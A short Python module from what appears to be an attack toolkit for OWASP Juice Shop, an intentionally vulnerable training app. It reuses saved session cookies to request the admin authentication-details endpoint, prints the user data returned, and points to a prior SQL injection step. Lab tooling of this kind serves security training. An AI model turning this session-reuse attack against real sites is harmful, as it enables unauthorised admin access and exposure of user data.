from . import attack as a
from .header_config import *
import http.cookiejar as cookielib

class admin_section(a.attack_inter):
    def __init__(self):
        # First trying to load cookies from local cookie file
        self.juice_session = a.requests.session()
        self.url = a.URL + '/rest/user/authentication-details/'

    def generator(self):
        cookie = a.load_cookie()
        return cookie

    def run(self):

        cookie = self.generator()
        if cookie:
            response = self.juice_session.get(self.url, cookies=cookie )
            #print(response.text)
            if response.status_code == 304:
                print("successfully get admin dashboard")
                print(response.text)
            print(response.status_code)
        else:
            print("Not have authentification yet, please try SQL injection first")
